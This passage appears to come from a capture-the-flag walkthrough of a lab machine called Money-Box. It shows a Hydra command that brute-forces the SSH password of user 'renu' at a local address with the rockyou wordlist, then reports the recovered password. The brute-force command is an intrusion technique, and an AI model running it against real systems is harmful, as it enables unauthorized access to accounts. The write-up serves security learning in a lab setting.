# Hydra

Assuming that we have a username `renu` and the password is too weak, we can try to bruteforce the password using the `rockyou` password file using the `SSH` service.

```
$sudo hydra -l renu -P /home/pranavarao/Pranava__Rao/Tools/Word-List/rockyou.txt ssh://192.168.0.7
```

![Pasted image 20231120152035](https://github.com/Rao-Pranava/Money-Box/assets/93928268/ff984a48-6f7d-40c2-acb9-e3065076c8b9)


We found the password of the user! The password is `987654321`, we can try to `SSH` into the machine.
